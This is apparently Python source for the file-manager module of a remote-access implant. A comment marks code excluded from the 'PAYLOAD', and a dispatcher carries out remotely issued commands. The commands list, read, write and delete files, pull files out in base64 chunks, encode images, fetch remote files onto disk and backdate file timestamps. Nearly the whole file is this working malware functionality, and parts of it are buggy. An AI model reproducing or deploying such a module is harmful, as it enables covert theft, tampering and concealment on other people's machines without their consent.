'''

File Manager v1.0.0
Author: ISSAC

Todo:
Compress
Extract

'''

import sys

sys.path.append('../../../')

from lib.tool import EZData, Encoder

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import os
import time
import base64
import zipfile
import urllib.request
import urllib.parse
import threading
import shutil

from datetime import datetime
from pathlib import Path

lock = threading.Lock()

class File:
    def __init__(self):
        pass

    '''
    Convert octal to permission in string.
    '''
    def get_permissions(self, mode) -> str:
        permissions = ''
        permissions += 'r' if mode & 0o400 else '-'
        permissions += 'w' if mode & 0o200 else '-'
        permissions += 'x' if mode & 0o100 else '-'
        permissions += 'r' if mode & 0o040 else '-'
        permissions += 'w' if mode & 0o020 else '-'
        permissions += 'x' if mode & 0o010 else '-'
        permissions += 'r' if mode & 0o004 else '-'
        permissions += 'w' if mode & 0o002 else '-'
        permissions += 'x' if mode & 0o001 else '-'

        return permissions

    '''
    Scan directory entries with full path.

    nMaxFolder: Maximum folder count.
    nMaxFile: Maximum file count.
    '''
    def scandir(self, szDir, nMaxFolder: int, nMaxFile: int) -> list:
        try:
            ls_result = list()

            nCntFolder = 0
            nCntFile = 0

            with os.scandir(szDir) as entries:
                for entry in entries:
                    try:
                        name = entry.name

                        if nCntFolder == nMaxFolder and nCntFile == nMaxFile:
                            break

                        if entry.is_dir() and nCntFolder == nMaxFolder:
                            continue
                        elif (entry.is_file() or entry.is_symlink()) and nCntFile == nMaxFile:
                            continue

                        if entry.is_dir():
                            name = '/' + name
                        elif entry.is_symlink():
                            name = f'{name} -> {os.readlink(entry.path)}'

                        szPermission = self.get_permissions(entry.stat().st_mode)

                        dic_entry = {
                            'Name': name,
                            'Size': entry.stat().st_size,
                            'Permission': f'd{szPermission}' if entry.is_dir() else f'-{szPermission}',
                            'CreateDate': time.ctime(entry.stat().st_ctime),
                            'LastModified': time.ctime(entry.stat().st_mtime),
                            'LastAccessed': time.ctime(entry.stat().st_atime)
                        }

                        ls_result.append(dic_entry)

                        if entry.is_dir() or (entry.is_symlink() and os.path.isdir(os.readlink(entry.path))) and nMaxFolder != -1:
                            nCntFolder += 1
                        elif entry.is_file() or (entry.is_symlink() and os.path.isfile(os.readlink(entry.path))) and nMaxFile != -1:
                            nCntFile += 1
                    
                    except Exception as ex:
                        #print(ex)
                        pass
            
            return ls_result
        except Exception as ex:
            #raise ex
            pass
    
    def write(self, szFilename: str, szContent: str) -> bool:
        try:
            with open(szFilename, 'w') as f:
                f.write(szContent)
            
            return True
        except Exception as ex:
            return False
        
    def read(self, lsFiles: list) -> list:
        ls_results = list()

        for szFilename in lsFiles:
            try:
                with open(szFilename, 'r', encoding='utf-8', errors='replace') as f:
                    ls_results.append([szFilename, f.read()])

            except Exception as ex:
                ls_results.append([szFilename, str(ex)])
        
        return ls_results
        
    def wget(self, szUrl) -> tuple[str, str, int, str]:
        nCode = 1
        szMsg = 'OK'
        szFilename = None

        try:
            with urllib.request.urlopen(szUrl) as resp:
                content_dispostion = resp.headers.get('Content-Disposition')

                if content_dispostion and 'filename=' in content_dispostion:
                    szFilename = content_dispostion.split('filename=')[-1].strip('"\'')
                else:
                    szFilename = os.path.basename(szUrl)

                if not szFilename:
                    szFilename = ''
                    raise Exception('szFilename is None')
                
                szFilename = urllib.parse.unquote(szFilename)

                with open(szFilename, 'wb') as f:
                    f.write(resp.read())

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (szUrl, szFilename, nCode, szMsg)

    def delete(self, szFilename) -> tuple[str, int, str]:
        nCode = 1
        szMsg = ''

        try:
            if os.path.isdir(szFilename):
                shutil.rmtree(szFilename)
            else:
                os.remove(szFilename)

            szMsg = 'OK'
        except Exception as ex:
            szMsg = str(ex)
            nCode = 0

        return (szFilename, nCode, szMsg)

    '''
    Upload file write chunk.
    '''
    def uf_write(self, szFilePath: str, nIndex: int, nChunkSize: int, nTotalSize: int, abChunkData: bytes) -> tuple[int, str]:
        nCode = 0
        szMsg = ''

        try:
            with open(szFilePath, mode='ab') as f:
                nOffset = nIndex * nChunkSize
                f.seek(nOffset)
                f.write(abChunkData)

                nCode = 1
                print(f'=> {nIndex}')
        except Exception as ex:
            szMsg = str(ex)
        
        return (nCode, szMsg)

    def goto(self, szDirName: str) -> bool:
        return os.path.exists(szDirName)
    
    def copy_file(self, szSrcFilename, szDstFilename, buffer_size: int = 1024 * 1024) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'

        try:
            if not os.path.exists(szSrcFilename):
                raise Exception("Source file not exists.")

            with open(szSrcFilename, 'rb') as fSrc, open(szDstFilename, 'wb') as fdst:
                while chunk := fSrc.read(buffer_size):
                    fdst.write(chunk)
            
            if not os.path.exists(szDstFilename):
                raise Exception('Destination file not exists, copy failed.')

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def copy_dir(self, szSrcDir, szDstDir) -> tuple[int, str]:
        nCode = 1
        szMsg = 'OK'

        try:
            def copy(szDir: str, szDirRoot: str = None):
                if not szDirRoot:
                    szDirRoot = szDir

                with os.scandir(szDir) as entries:
                    for entry in entries:
                        if entry.is_dir():
                            szNextDir = os.path.join(szDir, entry.name)

                            if szNextDir == szDstDir:
                                continue

                            szRelativeDir = szNextDir.replace(szDirRoot, '')
                            szNewDir = os.path.join(szDstDir, szRelativeDir)

                            if not os.path.exists(szNewDir):
                                os.makedirs(szNewDir, exist_ok=True)

                            copy(szNextDir, szDirRoot)
                        else:
                            szRelativeDir = szDir.replace(szDirRoot, '')
                            szNewDir = os.path.join(szDstDir, szRelativeDir)
                            szFilename = os.path.join(szNewDir, entry.name)

                            szOrignal = os.path.join(szDir, entry.name)

                            self.copy_file(szOrignal, szFilename)
            
            copy(szSrcDir)

        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def rename(self, szSrcName, szDstName):
        os.rename(szSrcName, szDstName)
    
    def image2base64(self, szImgFilename: str) -> tuple[int, str]:
        nCode = 1
        szMsg = ''

        try:
            with open(szImgFilename, 'rb') as img:
                szMsg = base64.b64encode(img.read()).decode('utf-8')
        except Exception as ex:
            szMsg = str(ex)
            nCode = 0
        
        return (nCode, szMsg)
    
    def archive_zip(self, lsFolderPath: list, lsFilePath: list, zf: zipfile.ZipFile):
        for szDirPath in lsFolderPath:
            lsNewFolderPath = []
            lsNewFilePath = []

            for entry in os.scandir(szDirPath):
                if entry.is_file():
                    lsNewFilePath.append(entry.path)
                elif entry.is_dir():
                    lsNewFolderPath.append(entry.path)

            self.archive_zip(lsNewFolderPath, lsNewFilePath, zf)

        for szFilePath in lsFilePath:
            zf.write(szFilePath)

    def archive_unzip(self, zip_path: str, separate_folder: bool):
        zip_path = Path(zip_path)
    
        if not zip_path.is_file():
            raise Exception('This is not a zip file.')
        
        if not zipfile.is_zipfile(zip_path):
            raise Exception('File is not a valid zip archive.')

        extract_to = zip_path.with_suffix('') if separate_folder else Path(zip_path.parent)
        extract_to.mkdir(parents=True, exist_ok=True)

        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_to)
        except Exception as e:
            raise Exception(f"Failed to extract zip file: {e}")

        #print(f"Extracted to {extract_to.resolve()}")

    def run(self, clnt: object, szToken: str, aMsg: list) -> list:
        try:
            if aMsg[0] == 'init':
                return [
                    'file',
                    'init',
                    os.getcwd(),
                ]
            elif aMsg[0] == 'ls':
                szDir = aMsg[1]
                nMaxFolder = int(aMsg[2])
                nMaxFile = int(aMsg[3])

                return [
                    'file',
                    'ls',
                    szDir,
                    EZData.lsDic2Str(self.scandir(szDir, nMaxFolder, nMaxFile)),
                ]
            elif aMsg[0] == 'write':
                szFilename = aMsg[1]
                szContent = Encoder.b64d2str(aMsg[2])
                try:
                    with open(szFilename, 'w', encoding='utf-8') as f:
                        f.write(szContent)
                    
                    return [
                        'file',
                        'write',
                        '1',
                        szFilename,
                    ]
                except Exception as ex:
                    return [
                        'file',
                        'write',
                        '0',
                        str(ex),
                    ]
            elif aMsg[0] == 'read':
                ls_results = self.read(aMsg[1:])
                ls =  [
                    'file',
                    'read',
                    EZData.twoDlist2str(ls_results),
                ]

                return ls
            elif aMsg[0] == 'del':
                ls_results = list()
                for szFilename in aMsg[1:]:
                    ls_output = self.delete(szFilename)
                    ls_results.append([ls_output[0], str(ls_output[1]), ls_output[2]])
                
                return [
                    'file',
                    'del',
                    EZData.twoDlist2str(ls_results)
                ]
            elif aMsg[0] == 'uf':
                if aMsg[1] == 'write':
                    chunk_size = int(aMsg[2])
                    offset = int(aMsg[3])
                    filepath = aMsg[4]
                    b64 = aMsg[5]

                    try:
                        buffer = base64.b64decode(b64)

                        with open(filepath, 'ab') as f:
                            f.seek(offset)
                            f.write(buffer)

                        return [
                            'file',
                            'uf',
                            'write',
                            '1',
                            filepath,
                            str(len(buffer)),
                        ]
                    except Exception as ex:
                        return [
                            'file',
                            'uf',
                            'write',
                            '0',
                            filepath,
                            str(ex),
                        ]
                    
            elif aMsg[0] == 'df':
                if aMsg[1] == 'read':
                    chunk_size = int(aMsg[2])
                    offset = int(aMsg[3])
                    filepath = aMsg[4]

                    try:
                        with open(filepath, 'rb') as f:
                            f.seek(offset)
                            buffer = f.read(chunk_size)
                        
                        b64 = base64.b64encode(buffer).decode('utf-8')
                        file_size = os.path.getsize(filepath)

                        return [
                            'file',
                            'df',
                            'read',
                            '1',
                            filepath,
                            b64,
                            str(file_size),
                        ]
                    except Exception as ex:
                        return [
                            'file',
                            'df',
                            'read',
                            '0',
                            filepath,
                            str(ex),
                        ]
                    
            elif aMsg[0] == 'goto':
                nCode = int(self.goto(aMsg[1]))
                return [
                    'file',
                    'goto',
                    aMsg[1],
                    str(nCode),
                ]
            elif aMsg[0] == 'paste':
                bMove = aMsg[1] == "1"
                lsSources = EZData.oneSpliter2list(aMsg[2])
                szDstDir = aMsg[3]

                ls_results = list()

                for szSrcEntry in lsSources:
                    tpOutput = tuple()

                    bIsDir = szSrcEntry[-1] == '/'
                    if bIsDir:
                        tpOutput = self.copy_dir(szSrcEntry, szDstDir)
                    else:
                        szDstFile = os.path.join(szDstDir, szSrcEntry.split('/')[-1])
                        tpOutput = self.copy_file(szSrcEntry, szDstFile)
                    
                    if bMove:
                        t = self.delete(szSrcEntry)
                        tpOutput[0] = t[1]
                        tpOutput[1] = t[2]

                    ls_results.append([str(tpOutput[0]), tpOutput[1]])

                return [
                    'file',
                    'paste',
                    aMsg[1],
                    EZData.twoDlist2str(ls_results)
                ]
            elif aMsg[0] == 'wget':
                ls = list()

                for szUrl in EZData.oneSpliter2list(aMsg[1]):
                    tup = self.wget(szUrl)
                    ls.append(
                        [
                            szUrl, # URL
                            tup[1], # Filename
                            str(tup[2]), # Code
                            tup[3], # Msg
                        ]
                    )
                
                ls = [
                    'file',
                    'wget',
                    EZData.twoDlist2str(ls),
                ]
                
                return ls
            
            elif aMsg[0] == 'img':
                ls = []
                for szImgFilename in EZData.oneSpliter2list(aMsg[1]):
                    tup = self.image2base64(szImgFilename)
                    ls.append(
                        [
                            szImgFilename,
                            str(tup[0]),
                            tup[1],
                        ]
                    )
                
                return [
                    'file',
                    'img',
                    EZData.twoDlist2str(ls)
                ]
            
            elif aMsg[0] == 'new':
                if aMsg[1] == 'd':
                    szDirPath = Encoder.b64d2str(aMsg[2])
                    os.mkdir(szDirPath)

                    return [
                        'file',
                        'new',
                        'd',
                        aMsg[2],
                        '1'
                    ]
            
            elif aMsg[0] == 'archive':
                if aMsg[1] == 'zip':
                    szArchiveFileName = aMsg[2]
                    lsDirPath = [p for p in EZData.oneSpliter2list(aMsg[3]) if p]
                    lsFilePath = [p for p in EZData.oneSpliter2list(aMsg[4]) if p]

                    try:
                        with zipfile.ZipFile(szArchiveFileName, mode='a') as zf:
                            self.archive_zip(lsDirPath, lsFilePath, zf)

                        if not os.path.exists(szArchiveFileName):
                            raise Exception('Compressing file failed: ' + szArchiveFileName)

                        return [
                            'file',
                            'archive',
                            'zip',
                            '1',
                            szArchiveFileName,
                        ]
                    
                    except Exception as ex:
                        return [
                            'file',
                            'archive',
                            'zip',
                            '0',
                            szArchiveFileName,
                            str(ex),
                        ]

                elif aMsg[1] == 'unzip':
                    method = aMsg[2]
                    lsArchiveFilePath = EZData.oneSpliter2list(aMsg[3])
                    separate_folder = method == 'Separate'

                    ls_result = []
                    for zip_file in lsArchiveFilePath:
                        try:
                            self.archive_unzip(zip_file, separate_folder)
                            ls_result.append(['1', zip_file, ''])
                        except Exception as ex:
                            ls_result.append(['0', zip_file, str(ex)])

                    return [
                        'file',
                        'archive',
                        'unzip',
                        EZData.twoDlist2str(ls_result),
                    ]
            
            elif aMsg[0] == 'dt': # Datetime
                try:
                    filepath = aMsg[1]
                    s = aMsg[2]
                    assert isinstance(s, str)
                    dt = datetime.fromisoformat(s.replace('Z', '+00:00'))
                    ts = dt.timestamp()
                    os.utime(filepath, (ts, ts))

                    return [
                        'file',
                        'dt',
                        '1',
                        filepath,
                    ]
                except Exception as ex:
                    return [
                        'file',
                        'dt',
                        '0',
                        str(ex),
                    ]
                
            elif aMsg[0] == 'rename':
                srcPath = aMsg[1]
                dstPath = aMsg[2]
                
                try:
                    src = Path(srcPath)
                    src.rename(dstPath)

                    return [
                        'file',
                        'rename',
                        '1',
                        srcPath,
                        dstPath,
                    ]
                except Exception as ex:
                    return [
                        'file',
                        'rename',
                        '0',
                        str(ex),
                    ]

        except Exception as ex:
            ls = [
                'file',
                'error',
                str(ex),
                ex.__class__.__name__,
            ]

            return ls

if __name__ == '__main__':
    f = File()
    f.run(None, sys.argv[1:])